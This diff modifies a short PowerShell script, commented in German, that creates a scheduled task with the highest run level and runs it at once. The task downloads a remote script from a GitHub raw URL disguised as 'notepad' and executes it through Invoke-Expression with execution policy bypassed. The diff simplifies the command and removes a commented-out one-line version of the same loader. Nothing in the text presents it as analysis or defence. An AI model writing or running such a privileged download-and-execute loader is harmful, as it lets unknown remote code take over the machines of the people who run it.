@@ -1,12 +1,9 @@
-$taskName = "MeinErhöhterTask"
 $scriptUrl = "https://raw.githubusercontent.com/Lorcan84/test/main/notepad"
-$taskCommand = "powershell.exe -ExecutionPolicy Bypass -Command `"& { $script = Invoke-WebRequest -Uri '$scriptUrl' -UseBasicParsing; Invoke-Expression $script.Content }`""
+$taskName = "MeinErhöhterTask"
+$taskCommand = "powershell.exe -ExecutionPolicy Bypass -Command `"Invoke-WebRequest -Uri '$scriptUrl' -UseBasicParsing | Invoke-Expression`""
 
 # Geplante Aufgabe erstellen
 schtasks /create /tn $taskName /tr $taskCommand /sc once /st 00:00 /rl highest /f | Out-Null
 
 # Aufgabe sofort ausführen
 schtasks /run /tn $taskName
-
-
-#schtasks /create /tn "MeinSkriptTask" /tr "powershell.exe -ExecutionPolicy Bypass -Command `$script = Invoke-WebRequest -Uri `\"https://raw.githubusercontent.com/Lorcan84/test/main/notepad`\" -UseBasicParsing; Invoke-Expression `$script.Content`" /sc once /st 00:00 /rl highest /f; schtasks /run /tn "MeinSkriptTask";
